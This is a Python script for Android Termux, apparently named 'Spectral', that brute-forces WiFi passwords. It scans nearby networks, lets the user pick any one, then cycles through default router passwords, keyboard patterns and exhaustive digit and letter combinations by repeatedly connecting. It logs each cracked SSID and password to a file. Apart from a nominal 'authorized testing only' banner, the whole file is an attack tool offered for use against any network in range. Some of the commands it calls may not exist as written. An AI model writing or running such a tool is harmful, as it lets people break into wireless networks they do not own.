#!/data/data/com.termux/files/usr/bin/python3
"""
Spectral - WiFi Password Brute Force Tool (Generative Engine)
Termux Rootless Edition
Authorized Penetration Testing Only
"""

import subprocess
import sys
import os
import re
import time
import json
import signal
import itertools
import string
import math
import threading
from typing import Generator, List, Optional, Tuple
from datetime import datetime

# =============== CONFIG ===============
VERSION = "1.0"
AUTHOR = "Spectral (Termux Rootless)"
BANNER = f"""
{'\033[96m'}{'='*60}
   ███████  ██████  ███████  ██████  ████████ ██████   █████  ██      
   ██      ██      ██      ██         ██    ██   ██ ██   ██ ██      
   ███████ ██      █████   ██         ██    ██████  ███████ ██      
        ██ ██      ██      ██         ██    ██   ██ ██   ██ ██      
   ███████  ██████  ███████  ██████    ██    ██   ██ ██   ██ ███████ 
{'='*60}
        WiFi Brute Force Engine v{VERSION} (Rootless)
     Authorized Security Testing Tool
{'='*60}{'\033[0m'}
"""

# Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BLUE = '\033[94m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'
DIM = '\033[2m'

stop_attack = False
password_found = None
found_event = threading.Event()

# =============== SIGNAL HANDLING ===============

def signal_handler(sig, frame):
    global stop_attack
    print(f"\n{YELLOW}[!] Interrupted. Returning to menu...{RESET}")
    stop_attack = True
    found_event.set()

signal.signal(signal.SIGINT, signal_handler)

# =============== UTILITIES ===============

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def check_termux_api() -> bool:
    """Check if termux-wifi-* tools are available."""
    for cmd in ['termux-wifi-scaninfo', 'termux-wifi-connection']:
        try:
            subprocess.run([cmd, '--help'], capture_output=True, timeout=3)
            return True
        except:
            pass
    return False

def human_readable_count(n: int) -> str:
    if n < 1000: return str(n)
    elif n < 1_000_000: return f"{n/1000:.1f}K"
    elif n < 1_000_000_000: return f"{n/1_000_000:.1f}M"
    elif n < 1_000_000_000_000: return f"{n/1_000_000_000:.1f}B"
    else: return f"{n/1_000_000_000_000:.1f}T"

def human_time(seconds: float) -> str:
    if seconds < 60: return f"{seconds:.0f}s"
    elif seconds < 3600: return f"{seconds/60:.1f}m"
    elif seconds < 86400: return f"{seconds/3600:.1f}h"
    else: return f"{seconds/86400:.1f}d"

def get_current_ssid() -> Optional[str]:
    """Get the SSID currently connected to via Termux API."""
    try:
        result = subprocess.run(
            ['termux-wifi-connection'],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            data = json.loads(result.stdout)
            ssid = data.get('ssid', '')
            if ssid:
                return ssid
    except:
        pass
    return None

# =============== NETWORK SCANNING ===============

def scan_networks() -> List[dict]:
    """Scan for nearby WiFi networks using Termux API."""
    print(f"{CYAN}[*] Scanning for WiFi networks...{RESET}")
    
    networks = []
    
    try:
        result = subprocess.run(
            ['termux-wifi-scaninfo'],
            capture_output=True, text=True, timeout=20
        )
        
        if result.returncode == 0 and result.stdout.strip():
            data = json.loads(result.stdout)
            seen = set()
            for net in data:
                ssid = net.get('ssid', '').strip()
                if not ssid or ssid in seen:
                    continue
                seen.add(ssid)
                
                bssid = net.get('bssid', 'N/A')
                rssi = net.get('rssi', net.get('signal_level', 0))
                freq = net.get('frequency', net.get('center_freq0', 0))
                channel = net.get('channel', '?')
                capabilities = net.get('capabilities', 'Unknown')
                
                # Determine encryption type
                enc = 'WPA2'
                cap_upper = capabilities.upper()
                if 'WPA3' in cap_upper:
                    enc = 'WPA3'
                elif 'WPA2' in cap_upper:
                    enc = 'WPA2'
                elif 'WPA' in cap_upper:
                    enc = 'WPA'
                elif 'WEP' in cap_upper:
                    enc = 'WEP'
                else:
                    enc = 'Open'
                
                # Signal bars
                if isinstance(rssi, (int, float)):
                    if rssi > -50: bars = '████'
                    elif rssi > -60: bars = '███░'
                    elif rssi > -70: bars = '██░░'
                    elif rssi > -80: bars = '█░░░'
                    else: bars = '░░░░'
                else:
                    bars = '????'
                
                networks.append({
                    'ssid': ssid,
                    'bssid': bssid,
                    'rssi': rssi,
                    'bars': bars,
                    'channel': channel,
                    'encryption': enc,
                    'capabilities': capabilities
                })
            
            # Sort by signal strength (strongest first)
            networks.sort(key=lambda x: x['rssi'] if isinstance(x['rssi'], (int, float)) else -100, reverse=True)
    except FileNotFoundError:
        print(f"{RED}[!] termux-wifi-scaninfo not found. Install: pkg install termux-api{RESET}")
    except json.JSONDecodeError:
        print(f"{RED}[!] Failed to parse scan results.{RESET}")
    except subprocess.TimeoutExpired:
        print(f"{RED}[!] Scan timed out.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Scan error: {e}{RESET}")
    
    return networks

def display_networks(networks: List[dict]):
    """Display scanned networks in a formatted table."""
    if not networks:
        print(f"{RED}[!] No networks found.{RESET}")
        return
    
    # Check what network we're currently connected to
    current_ssid = get_current_ssid()
    
    print(f"\n{BOLD}{'SSID':<32} {'BSSID':<18} {'SIG':<6} {'CH':<4} {'ENC':<6}{'CUR':<5}{RESET}")
    print(f"{DIM}{'-'*75}{RESET}")
    
    for i, net in enumerate(networks, 1):
        ssid = net['ssid'][:30] if len(net['ssid']) > 30 else net['ssid']
        bars = net['bars']
        enc = net['encryption']
        
        # Indicate if currently connected
        is_current = '◄' if current_ssid and ssid == current_ssid else ''
        
        # Color by signal
        rssi = net['rssi'] if isinstance(net['rssi'], (int, float)) else -100
        if rssi > -60:
            sig_color = GREEN
        elif rssi > -75:
            sig_color = YELLOW
        else:
            sig_color = RED
        
        print(f"{i:2}. {CYAN}{ssid:<30}{RESET} "
              f"{DIM}{net['bssid']:<18}{RESET} "
              f"{sig_color}{bars}{RESET} "
              f"{net['channel']:<4} "
              f"{MAGENTA}{enc:<6}{RESET}"
              f"{GREEN}{is_current:<5}{RESET}")

# =============== WIFI CONNECTION (Rootless Termux) ===============

def try_wifi_password(ssid: str, password: str) -> bool:
    """
    Attempt to connect to WiFi with given password using Termux API.
    This is the rootless method - we need to disconnect and reconnect.
    """
    try:
        # First, disconnect from current network
        subprocess.run(
            ['termux-wifi-connection', 'disconnect'],
            capture_output=True, timeout=3
        )
        time.sleep(0.3)
        
        # Connect to target with password
        # Termux API uses a specific format for connections
        result = subprocess.run(
            ['termux-wifi-connect', ssid, password],
            capture_output=True, text=True, timeout=10
        )
        
        if result.returncode == 0:
            # Wait briefly for connection to establish
            time.sleep(1.5)
            
            # Verify we're connected to the right network
            current = get_current_ssid()
            if current and current == ssid:
                return True
                
        return False
        
    except FileNotFoundError:
        # termux-wifi-connect not available, try alternative method
        pass
    except subprocess.TimeoutExpired:
        pass
    except Exception:
        pass
    
    try:
        # Alternative: Use termux-wifi-connection to enable/connect
        # This is more limited but works on some devices
        result = subprocess.run(
            ['termux-wifi-connection', ssid, password],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            time.sleep(1.5)
            current = get_current_ssid()
            if current and current == ssid:
                return True
    except:
        pass
    
    return False

def disconnect_wifi():
    """Disconnect from current WiFi using Termux API."""
    try:
        subprocess.run(
            ['termux-wifi-connection', 'disconnect'],
            capture_output=True, timeout=3
        )
    except:
        pass
    time.sleep(0.2)

# =============== PASSWORD GENERATORS ===============

def generate_numeric(length: int) -> Generator[str, None, None]:
    for combo in itertools.product(string.digits, repeat=length):
        yield ''.join(combo)

def generate_lowercase(length: int) -> Generator[str, None, None]:
    for combo in itertools.product(string.ascii_lowercase, repeat=length):
        yield ''.join(combo)

def generate_alphanumeric(length: int) -> Generator[str, None, None]:
    chars = string.ascii_lowercase + string.digits
    for combo in itertools.product(chars, repeat=length):
        yield ''.join(combo)

def generate_mixedcase_alphanumeric(length: int) -> Generator[str, None, None]:
    chars = string.ascii_letters + string.digits
    for combo in itertools.product(chars, repeat=length):
        yield ''.join(combo)

def generate_common_patterns(ssid: str = '') -> Generator[str, None, None]:
    common = [
        'admin', 'password', '12345678', '123456789', '1234567890',
        'qwerty123', 'qwerty1', '11111111', '00000000', 'admin123',
        'letmein', 'welcome1', 'P@ssw0rd', 'passw0rd', 'changeme',
        'default', 'guest', 'root', 'user', 'test1234', 'pass1234',
        'admin', 'password', '1234', '12345', '123456', '0000',
        'linksys', 'netgear', 'dlink', 'tp-link', 'asus', 'belkin',
        'wireless', 'home', 'family', 'default', 'motorola',
    ]
    yield from common
    
    bases = ['admin', 'pass', 'wifi', 'home', 'net', 'user', 'root', 'test', 'guest']
    for base in bases:
        for suffix in ['123', '1234', '12345', '1', '!', '@', '69', '007']:
            yield f"{base}{suffix}"
            yield f"{base.capitalize()}{suffix}"
    
    for year in range(2000, 2030):
        yield str(year)
        for word in ['admin', 'pass', 'wifi', 'home']:
            yield f"{word}{year}"
    
    kb_patterns = [
        'qwerty', 'qwertyuiop', 'qwerty123', 'asdfgh', 'asdfghjkl',
        'zxcvbn', '1q2w3e4r', '1qaz2wsx', 'qwerty12345',
        'qwe123', 'asd123', 'zxc123', '1q2w3e4r5t',
    ]
    yield from kb_patterns
    
    if ssid:
        yield ssid
        yield ssid.lower()
        yield ssid.upper()
        yield ssid + '123'
        yield ssid + '1234'
        yield ssid + '1'
        yield ssid + '!'
        
        ssid_lower = ssid.lower()
        if 'linksys' in ssid_lower:
            yield 'admin'
        if 'netgear' in ssid_lower:
            yield 'password'
            yield '1234'
        if 'tplink' in ssid_lower or 'tp-link' in ssid_lower:
            yield 'admin'
        if 'dlink' in ssid_lower or 'd-link' in ssid_lower:
            yield 'admin'
            yield '1234'

def password_generator(mode: str, min_len: int, max_len: int, ssid: str = '') -> Generator[str, None, None]:
    tried = set()
    
    def dedup(gen):
        for pwd in gen:
            if pwd not in tried and min_len <= len(pwd) <= max_len:
                tried.add(pwd)
                yield pwd
    
    yield from dedup(generate_common_patterns(ssid))
    
    if mode == 'quick':
        for length in range(4, min(max_len + 1, 7)):
            yield from dedup(generate_numeric(length))
        return
    
    if mode in ['smart', 'aggressive', 'numeric', 'alphanum', 'full']:
        print(f"\n{CYAN}[*] Phase 1: Numeric ({min_len}-{min(max_len, 10)} digits)...{RESET}")
        for length in range(min_len, min(max_len + 1, 11)):
            yield from dedup(generate_numeric(length))
    
    if mode == 'numeric':
        return
    
    if mode in ['smart', 'aggressive', 'lowercase', 'alphanum', 'full']:
        print(f"\n{CYAN}[*] Phase 2: Lowercase (len 4-6)...{RESET}")
        for length in range(4, min(max_len + 1, 7)):
            yield from dedup(generate_lowercase(length))
    
    if mode == 'lowercase':
        return
    
    if mode in ['smart', 'aggressive', 'alphanum', 'full']:
        print(f"\n{CYAN}[*] Phase 3: Alphanumeric (len 4-7)...{RESET}")
        for length in range(4, min(max_len + 1, 8)):
            yield from dedup(generate_alphanumeric(length))
    
    if mode in ['smart', 'alphanum']:
        return
    
    if mode in ['aggressive', 'full']:
        print(f"\n{CYAN}[*] Phase 4: Long numeric (10-{max_len})...{RESET}")
        for length in range(10, min(max_len + 1, 13)):
            yield from dedup(generate_numeric(length))
    
    if mode in ['aggressive', 'full']:
        print(f"\n{CYAN}[*] Phase 5: Mixed-case alphanumeric (len 4-7)...{RESET}")
        for length in range(4, min(max_len + 1, 8)):
            yield from dedup(generate_mixedcase_alphanumeric(length))

def estimate_search_space(mode: str, min_len: int, max_len: int) -> int:
    total = 500
    
    if mode == 'quick':
        for l in range(4, min(max_len + 1, 7)):
            total += 10 ** l
        return total
    
    for l in range(min_len, min(max_len + 1, 11)):
        total += 10 ** l
    
    if mode == 'numeric':
        return total
    
    for l in range(4, min(max_len + 1, 7)):
        total += 26 ** l
    
    if mode == 'lowercase':
        return total
    
    for l in range(4, min(max_len + 1, 8)):
        total += 36 ** l
    
    if mode in ['smart', 'alphanum']:
        return total
    
    if mode in ['aggressive', 'full']:
        for l in range(10, min(max_len + 1, 13)):
            total += 10 ** l
        for l in range(4, min(max_len + 1, 8)):
            total += 62 ** l
    
    return total

# =============== BRUTE FORCE ENGINE ===============

def brute_force(ssid: str, mode: str, min_len: int, max_len: int, delay: float):
    global stop_attack, password_found
    
    stop_attack = False
    found_event.clear()
    password_found = None
    
    estimated = estimate_search_space(mode, min_len, max_len)
    
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  ATTACK STARTED (Rootless Mode){RESET}")
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"  {YELLOW}SSID:{RESET}          {ssid}")
    print(f"  {YELLOW}Mode:{RESET}          {mode}")
    print(f"  {YELLOW}Length range:{RESET}  {min_len}-{max_len}")
    print(f"  {YELLOW}Search space:{RESET}  ~{human_readable_count(estimated)} passwords")
    print(f"  {YELLOW}Delay:{RESET}         {delay}s")
    
    if estimated > 10_000_000:
        print(f"\n{RED}[!] WARNING: Large search space. Rootless Termux is SLOW.{RESET}")
        print(f"{RED}[!] Recommend 'quick' mode or short numeric targets.{RESET}")
        confirm = input(f"{CYAN}[?] Continue? (y/N): {RESET}")
        if confirm.lower() != 'y':
            print(f"{YELLOW}[!] Attack cancelled.{RESET}")
            return
    
    start_time = time.time()
    attempts = 0
    found = False
    
    progress_file = f".spectral_progress_{ssid.replace(' ', '_')}.txt"
    last_save = 0
    
    generator = password_generator(mode, min_len, max_len, ssid)
    
    print(f"\n{GREEN}[*] Attack running... (Ctrl+C to return to menu){RESET}\n")
    
    for password in generator:
        if stop_attack or found_event.is_set():
            break
        
        attempts += 1
        
        if attempts % 3 == 0 or attempts == 1:
            elapsed = time.time() - start_time
            rate = attempts / elapsed if elapsed > 0 else 0
            pct = (attempts / estimated * 100) if estimated > 0 else 0
            remaining = (estimated - attempts) / rate if rate > 0 else 0
            
            print(f"\r{YELLOW}[{attempts:>12,}] {RESET}"
                  f"{CYAN}{password:<25}{RESET} "
                  f"{GREEN}{pct:.4f}%{RESET} "
                  f"{DIM}{rate:.1f}/s{RESET} "
                  f"{MAGENTA}ETA: {human_time(remaining)}{RESET}  ", end='', flush=True)
        
        if attempts - last_save >= 50000:
            last_save = attempts
            try:
                with open(progress_file, 'w') as f:
                    f.write(f"Attempts: {attempts}\n")
                    f.write(f"Last password: {password}\n")
                    f.write(f"Elapsed: {time.time() - start_time:.1f}s\n")
                    f.write(f"Target: {ssid}\n")
            except:
                pass
        
        if attempts > 1:
            disconnect_wifi()
            time.sleep(max(0.1, delay * 0.3))
        
        if try_wifi_password(ssid, password):
            found = True
            password_found = password
            found_event.set()
            elapsed = time.time() - start_time
            rate = attempts / elapsed if elapsed > 0 else 0
            
            print(f"\n\n{GREEN}{'='*60}{RESET}")
            print(f"{GREEN}[+] {'='*56}{RESET}")
            print(f"{GREEN}[+] 🔓 PASSWORD FOUND!{RESET}")
            print(f"{GREEN}[+] {'='*56}{RESET}")
            print(f"{GREEN}[+] SSID:{RESET}     {ssid}")
            print(f"{GREEN}[+] Password:{RESET} {BOLD}{password}{RESET}")
            print(f"{MAGENTA}[+] Attempts:{RESET} {attempts:,}")
            print(f"{MAGENTA}[+] Time:{RESET}    {human_time(elapsed)}")
            print(f"{MAGENTA}[+] Rate:{RESET}    {rate:.1f} p/s")
            print(f"{GREEN}[+] {'='*56}{RESET}")
            
            result_file = 'spectral_cracked.txt'
            with open(result_file, 'a') as f:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}] {ssid}:{password}\n")
            print(f"{GREEN}[+] Saved to {result_file}{RESET}")
            
            input(f"\n{CYAN}[Press Enter to continue]{RESET}")
            break
        
        time.sleep(delay)
    
    if not found and not stop_attack:
        elapsed = time.time() - start_time
        print(f"\n\n{RED}[!] Password not found in search space.{RESET}")
        print(f"{YELLOW}[*] Tried {attempts:,} passwords in {human_time(elapsed)}{RESET}")
        print(f"{YELLOW}[*] Try different mode, increase max length, or lower delay{RESET}")
        input(f"\n{CYAN}[Press Enter to continue]{RESET}")

# =============== MENU FUNCTIONS ===============

def menu_scan_and_attack():
    clear_screen()
    print(f"{BANNER}")
    print(f"{BOLD}{' NETWORK SCANNER ':=^60}{RESET}\n")
    
    networks = scan_networks()
    display_networks(networks)
    
    if not networks:
        print(f"\n{YELLOW}[*] No networks found. Make sure Wi-Fi is enabled and Termux:API is installed.{RESET}")
        print(f"{YELLOW}[*] Also enable 'Wi-Fi Control' permission for Termux in Android settings.{RESET}")
        input(f"\n{CYAN}[Press Enter to return to menu]{RESET}")
        return
    
    print(f"\n{CYAN}[>] Options:{RESET}")
    print(f"  1. Select by number")
    print(f"  2. Type SSID manually")
    choice = input(f"\n{CYAN}[>] Choose (1/2): {RESET}").strip()
    
    target_ssid = None
    
    if choice == '1':
        try:
            idx = int(input(f"{CYAN}[>] Enter network number: {RESET}")) - 1
            if 0 <= idx < len(networks):
                target_ssid = networks[idx]['ssid']
                print(f"{GREEN}[+] Selected: {target_ssid}{RESET}")
            else:
                print(f"{RED}[!] Invalid number.{RESET}")
                input(f"{CYAN}[Press Enter]{RESET}")
                return
        except ValueError:
            print(f"{RED}[!] Invalid input.{RESET}")
            input(f"{CYAN}[Press Enter]{RESET}")
            return
    elif choice == '2':
        target_ssid = input(f"{CYAN}[>] Enter SSID: {RESET}").strip()
        if not target_ssid:
            print(f"{RED}[!] SSID cannot be empty.{RESET}")
            input(f"{CYAN}[Press Enter]{RESET}")
            return
        print(f"{GREEN}[+] Target: {target_ssid}{RESET}")
    else:
        print(f"{RED}[!] Invalid choice.{RESET}")
        input(f"{CYAN}[Press Enter]{RESET}")
        return
    
    menu_configure_attack(target_ssid)

def menu_manual_ssid():
    clear_screen()
    print(f"{BANNER}")
    print(f"{BOLD}{' MANUAL TARGET ':=^60}{RESET}\n")
    
    target_ssid = input(f"{CYAN}[>] Enter target SSID: {RESET}").strip()
    if not target_ssid:
        print(f"{RED}[!] SSID cannot be empty.{RESET}")
        input(f"{CYAN}[Press Enter]{RESET}")
        return
    
    menu_configure_attack(target_ssid)

def menu_configure_attack(ssid: str):
    clear_screen()
    print(f"{BANNER}")
    print(f"{BOLD}{' ATTACK CONFIGURATION ':=^60}{RESET}\n")
    print(f"  {YELLOW}Target:{RESET} {BOLD}{ssid}{RESET}\n")
    
    print(f"{BOLD}Attack Modes:{RESET}")
    print(f"  {GREEN}1.{RESET} quick      - Common patterns + 4-6 digit PIN (RECOMMENDED for rootless)")
    print(f"  {GREEN}2.{RESET} smart      - Common + numeric(1-10) + short alpha")
    print(f"  {GREEN}3.{RESET} aggressive - Everything up to 8 chars mixed case")
    print(f"  {GREEN}4.{RESET} numeric    - Numbers only (good for PIN-based networks)")
    print(f"  {GREEN}5.{RESET} lowercase  - Lowercase letters only")
    print(f"  {GREEN}6.{RESET} alphanum   - Lowercase + digits")
    print(f"  {GREEN}7.{RESET} full       - Full mixed alphanumeric (BIGGEST search)")
    
    mode_map = {
        '1': 'quick', '2': 'smart', '3': 'aggressive',
        '4': 'numeric', '5': 'lowercase', '6': 'alphanum', '7': 'full'
    }
    
    mode_choice = input(f"\n{CYAN}[>] Select mode [1 quick for rootless]: {RESET}").strip() or '1'
    mode = mode_map.get(mode_choice, 'quick')
    print(f"{GREEN}[+] Mode: {mode}{RESET}")
    
    min_input = input(f"{CYAN}[>] Min password length [1]: {RESET}").strip()
    min_len = int(min_input) if min_input.isdigit() else 1
    
    max_input = input(f"{CYAN}[>] Max password length [8]: {RESET}").strip()
    max_len = int(max_input) if max_input.isdigit() else 8
    
    if min_len > max_len:
        min_len, max_len = 1, max_len
    if min_len < 1:
        min_len = 1
    
    print(f"{GREEN}[+] Length range: {min_len} - {max_len}{RESET}")
    
    delay_input = input(f"{CYAN}[>] Delay between attempts in seconds [0.5]: {RESET}").strip()
    try:
        delay = float(delay_input)
    except ValueError:
        delay = 0.5
    
    # Show estimate
    estimated = estimate_search_space(mode, min_len, max_len)
    est_time = estimated * delay
    print(f"\n{YELLOW}[*] Estimated search space: {human_readable_count(estimated)} passwords{RESET}")
    print(f"{YELLOW}[*] Estimated time: {human_time(est_time)}{RESET}")
    
    if estimated > 1_000_000:
        print(f"{RED}[!] This may take a very long time on rootless Termux (slow API calls).{RESET}")
    
    confirm = input(f"\n{GREEN}[?] Start attack on '{ssid}'? (Y/n): {RESET}").lower()
    if confirm == 'n':
        print(f"{YELLOW}[!] Attack cancelled.{RESET}")
        input(f"{CYAN}[Press Enter]{RESET}")
        return
    
    brute_force(ssid, mode, min_len, max_len, delay)

def menu_quick_attack():
    clear_screen()
    print(f"{BANNER}")
    print(f"{BOLD}{' QUICK ATTACK ':=^60}{RESET}\n")
    print(f"{YELLOW}[*] This will scan and let you pick a network for quick attack.{RESET}\n")
    
    networks = scan_networks()
    display_networks(networks)
    
    if not networks:
        input(f"{CYAN}[Press Enter]{RESET}")
        return
    
    try:
        idx = int(input(f"\n{CYAN}[>] Enter network number to attack: {RESET}")) - 1
        if 0 <= idx < len(networks):
            ssid = networks[idx]['ssid']
            print(f"{GREEN}[+] Quick attacking: {ssid}{RESET}")
            brute_force(ssid, 'quick', 1, 8, 0.5)
        else:
            print(f"{RED}[!] Invalid number.{RESET}")
            input(f"{CYAN}[Press Enter]{RESET}")
    except ValueError:
        print(f"{RED}[!] Invalid input.{RESET}")
        input(f"{CYAN}[Press Enter]{RESET}")

def menu_scan_only():
    clear_screen()
    print(f"{BANNER}")
    print(f"{BOLD}{' NETWORK SCAN ':=^60}{RESET}\n")
    
    networks = scan_networks()
    display_networks(networks)
    
    if networks:
        print(f"\n{GREEN}[+] Found {len(networks)} networks{RESET}")
    
    input(f"\n{CYAN}[Press Enter to return to menu]{RESET}")

def menu_about():
    clear_screen()
    print(f"{BANNER}")
    print(f"{BOLD}{' ABOUT SPECTRAL (ROOTLESS) ':=^60}{RESET}\n")
    print(f"  {YELLOW}Version:{RESET}  {VERSION}")
    print(f"  {YELLOW}Author:{RESET}   {AUTHOR}")
    print(f"  {YELLOW}Platform:{RESET} Termux (Rootless)")
    print(f"\n  {DIM}This rootless edition uses the Termux:API companion app")
    print(f"  to scan and connect to WiFi networks. It does NOT require")
    print(f"  root access, wpa_supplicant, or nmcli.")
    print(f"\n  Requirements:")
    print(f"  • Termux:API app installed from F-Droid")
    print(f"  • 'pkg install termux-api'")
    print(f"  • Wi-Fi Control permission enabled for Termux")
    print(f"  • Location permission enabled (for scanning){RESET}")
    print(f"\n  {RED}[!] For authorized security testing only.{RESET}")
    print(f"  {YELLOW}[!] Rootless mode is slow (~0.5s/attempt). Use 'quick' mode.{RESET}")
    input(f"\n{CYAN}[Press Enter to return to menu]{RESET}")

# =============== MAIN MENU ===============

def main_menu():
    while True:
        clear_screen()
        print(f"{BANNER}")
        
        api_status = f"{GREEN}✓ Termux:API{RESET}" if check_termux_api() else f"{RED}✗ No Termux:API{RESET}"
        print(f"  Status: {api_status}\n")
        
        print(f"{BOLD}{' MAIN MENU (Rootless) ':=^60}{RESET}\n")
        print(f"  {GREEN}1.{RESET} {BOLD}Scan & Attack{RESET}     - Scan networks, pick one, configure attack")
        print(f"  {GREEN}2.{RESET} {BOLD}Quick Attack{RESET}      - Scan, pick, attack with defaults")
        print(f"  {GREEN}3.{RESET} {BOLD}Manual SSID{RESET}       - Type target SSID manually")
        print(f"  {GREEN}4.{RESET} {BOLD}Scan Only{RESET}         - Just view nearby networks")
        print(f"  {GREEN}5.{RESET} {BOLD}About{RESET}             - Tool info")
        print(f"  {RED}0.{RESET} {BOLD}Exit{RESET}\n")
        
        choice = input(f"{CYAN}[>] Select: {RESET}").strip()
        
        if choice == '1':
            menu_scan_and_attack()
        elif choice == '2':
            menu_quick_attack()
        elif choice == '3':
            menu_manual_ssid()
        elif choice == '4':
            menu_scan_only()
        elif choice == '5':
            menu_about()
        elif choice == '0':
            clear_screen()
            print(f"{BANNER}")
            print(f"\n{GREEN}[+] Exiting Spectral. Stay legal.{RESET}\n")
            sys.exit(0)
        else:
            print(f"{RED}[!] Invalid choice.{RESET}")
            time.sleep(1)

# =============== ENTRY POINT ===============

if __name__ == '__main__':
    clear_screen()
    print(f"{BANNER}")
    
    # Check Termux:API availability
    if check_termux_api():
        print(f"{GREEN}[+] Termux:API tools detected.{RESET}")
        print(f"{GREEN}[+] Run mode: Rootless (Termux API){RESET}\n")
    else:
        print(f"{RED}[!] Termux:API tools not detected.{RESET}")
        print(f"{YELLOW}[*] To use this tool in Termux:{RESET}")
        print(f"{YELLOW}  1. Install Termux:API from F-Droid (not Play Store){RESET}")
        print(f"{YELLOW}  2. pkg install termux-api termux-tools{RESET}")
        print(f"{YELLOW}  3. Enable Wi-Fi Control + Location permissions for Termux{RESET}")
        cont = input(f"\n{CYAN}[?] Continue anyway? (Y/n): {RESET}").lower()
        if cont == 'n':
            sys.exit(1)
    
    time.sleep(1.5)
    
    try:
        main_menu()
    except KeyboardInterrupt:
        clear_screen()
        print(f"{BANNER}")
        print(f"\n{YELLOW}[!] Interrupted. Exiting.{RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}[!] Fatal error: {e}{RESET}")
        sys.exit(1)
